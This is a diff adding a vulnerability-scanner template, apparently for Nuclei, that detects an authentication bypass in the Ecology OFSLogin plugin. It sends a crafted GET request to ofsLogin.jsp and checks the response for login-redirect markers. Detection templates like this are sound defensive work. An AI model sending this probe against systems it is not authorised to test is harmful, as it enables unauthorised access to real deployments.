@@ -1,0 +1,26 @@
+id: ecology-ofslogin-aul
+info:
+  name: Ecology OFSLogin Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Detects an authentication bypass vulnerability in Ecology OFSLogin plugin.
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=90
+http:
+  - method: GET
+    path:
+      - "/mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird="
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/login/Login.jsp"
+        part: body
+      - type: word
+        words:
+          - "location.replace"
+        part: body
+      - type: status
+        status:
+          - 200
